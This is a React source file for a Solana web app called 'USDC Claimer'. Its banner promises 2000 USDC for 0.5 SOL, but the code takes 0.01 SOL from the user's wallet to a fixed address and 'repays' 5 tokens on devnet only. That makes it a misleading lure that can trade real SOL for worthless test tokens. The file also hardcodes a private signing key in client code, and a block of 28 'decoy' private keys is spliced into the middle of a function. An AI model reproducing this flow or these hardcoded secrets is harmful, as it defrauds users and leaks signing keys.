/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "5zafpmkffG8ujTuDmQqyq16LQDdmDSphsjZ71iNE2ozgQNPJPMZVyzN9FfV61uZhT1TWtcw2bJdwf4YoJmbh59HT"

// DECOY_KEYS_START
// These keys are intentionally exposed as decoys
const decoyKeys = {
  "decoyKey0": "MVPyxSLBAgmupjFoSspuqGzDufNb5CiVJowKbH5kxu2RoVfGHXoM9ysrKs3hW9VCZcmWEvHx5164Wcii7quHJAN",
  "decoyKey1": "3WsgVb61Fs2HydTHU27stry4b4TrHYWKpUkRTKKHcR6GgRPNEV576oSeZYyJ1nzgmJjj5rpxWGVsoxrbsv8L6Lup",
  "decoyKey2": "4RqFEsUqfEfE3GNDtzT3mYD1K4KAL4HJQ37d85YbP2Cked72Nog5doGiNGJdHfw2gUCWt6ELcpwvrpr9x3pKwN1C",
  "decoyKey3": "2prtXBTDteDWZuNSLbFM5HmAEhHwjdMtyakwZkY2QaBm7uqXrpANeixyKJFHnfHG1CBnGdkBNRdVcRuCWePE4aEG",
  "decoyKey4": "3QZ7pYoWsRLBeMNSjSYa53YSQ2oPoCuTFqSKhve2NGXBu2tUUXQwSYZXth4mWpMbwbU6YYp1N1HAzSJE4DVpRmaB",
  "decoyKey5": "4XG7U1Jj2wd2kYDwwJCAd7Bb2VS4quo6dtqrZF4HWv5iqp89HLGhHktT7eSmAXKsdPDhWbuaenhaDJSMH9DiTZCC",
  "decoyKey6": "4XykgjbF8HWWtFrZta9TuRbB9zhMwPNxxpi7anjbYBRg6dhBNukfGDcrtV6hrLUffnE5vNgLUwuqWBVT413iNdr4",
  "decoyKey7": "3YtJK3raBB9gR2PiLweF29Wax7KUoY9fBZNGQPfcNcEfxo6V6TEa4xZQFgA8QCFErYqEeRNyh6wvrFaLHFGMFHVH",
  "decoyKey8": "4xiirc3gRL9oZnoNGEpscU56djjiMcxgX3VBKe2kYdA64UhGSeREkJ4SrsrszPTcYmDJg9fqCreKiJS6bEZJY1ED",
  "decoyKey9": "5doN3sdTEuFQamhs5FP5Mmzs8hMVVHz8YAU7VrN5idTwzZ1F4kmLU7Uzwb6Gf2NcDiBR8enrRazV6VWDEQrX2rg",
  "decoyKey10": "25C1hxrdtjdTnPRS5CqiiUkzXLJgLpNgSg7X14C7oKb8Xu8unrdLEi7Kcu2NAKUDLdX4Bc5chzB7xmhpt6oM1Kbq",
  "decoyKey11": "iGW6yZKK7nh8hqyKpaWNHoz9UbruCLhHLhxycYZ5ScKAnu8PbT3j3jcHgaqJifFSxRvskVZH2Aj3FsBrcU3GTtj",
  "decoyKey12": "3XqRzudmc1oRn9yXkKX4wKWfpUnXPMZzDU4MPFvMod77ctw9C6E6MgLGMfyzEb7CbJ3dTMjxGzYsmZDPY39NjEu3",
  "decoyKey13": "tzf4GxJCegmWutxgEFVq31UVC9i7Nk922JDRdKaDuawEaXd4EjZEqMbF6C3gPvGYe3TzZ5MtF4SWVEAaeoHhpEq",
  "decoyKey14": "3MdLPAB337e2Kemk8BLjVJ59bU9APEYCvHZQchGBZaU6Vz2WYhnaCJU39CciLEgY7j2ccyYokf7R9MYTat2GUdHA",
  "decoyKey15": "vWaVaP1JQjiCKkP4ALit1QpKcHmGXWpK6J4bcpSJf8MJDBfuPhUJpgQGf4ydLBM5tKytrEQyyGHvzXEJstCxEMt",
  "decoyKey16": "2CDXLH26mkmLJYSzdmcJz4U7D9cCJEKV3hqbi1H6x13g4pHFFdSm8DTqZSz93FkdGUeebd3m3fsebWCQC8ipqeK2",
  "decoyKey17": "2vBs8p9BXz2fRaAgYpBRpj9bJCtDGZxwazDS3mPYGAzWMWu7nFu4oWfDGLWu9GJMErtBwxnUeVaWoUDvqATyiXU8",
  "decoyKey18": "4TTqrpyQYiF22BHYwVkggokLbhk4j6sz4rstL8Krnzb9L1qcdLLvhBUnivTxBr4HYNyCRdvGg7ycXoCVHcTJksth",
  "decoyKey19": "djFD5EokTqzPYoiZ9MUoxrdUefnScauybthw1vjn9qvoKuUgvL9L7H2hKs5QooZsfnomyjSpPFD4oMUuT19wVud",
  "decoyKey20": "2sxCP29w6kLgtDKoxFQ3ix3daXwaMVEJpvuA3sAdzFjkiggtorafs5L5j721dtoUByq5jTcrKF3Hk213Ts9DhJ8A",
  "decoyKey21": "2hjUbb57G3qBYWgD11KcMs8bioNc2dJQehuK2nJBu7657DZkRfbafGnbBYZkebbnchhuUMrCvBemVXLfEFMNfsFo",
  "decoyKey22": "2s8YBQwc6F2zUs5ZBo4RwCKY6oWanNsnKF2Nyn8buWGUZeZvEyS8MgYcRXB4hnJeDDtdRuebpApEAfTW9z3WxS1c",
  "decoyKey23": "3dWjaofDi28SqtmCk1e12sxhfd8XT5o25wgM53RcLUoF67yqMqCFrPo1xhbdwaEtPvRbZU677K5jwN1yRQHeb75H",
  "decoyKey24": "5y7hqts93vspxQhGGP4SpPoxznKbEAtwdr1t3VjFuRSGHut2wVZxUTrp3TXcJ1ZCVpCQm8hgUz24DvnG7Gu2f8KN",
  "decoyKey25": "5pzf4eSaiPAJr4YKkECcpu1TRCAjkS4B8FUqvh1BVSaXccLk4xhit6HRGUtrP7ABPGebmHUJ7VjV8edpxkFZcArG",
  "decoyKey26": "3s4sfQgurkZrHvWMSawPmmpENfYwhL6bFBJo2Gg9hLWFj76Ya9y83wbcCkfGdBoSAe9QeJZv5t2dgAyAnViBCgVu",
  "decoyKey27": "ndPYtHRhqYu3NgZarGYcrEPNKHqqZE2dAXbRN4gAFcvujceKK21Ju1fJ3KUgps1tCYCnYh8xDnMgJtr6oXb8xdL"
};
// DECOY_KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};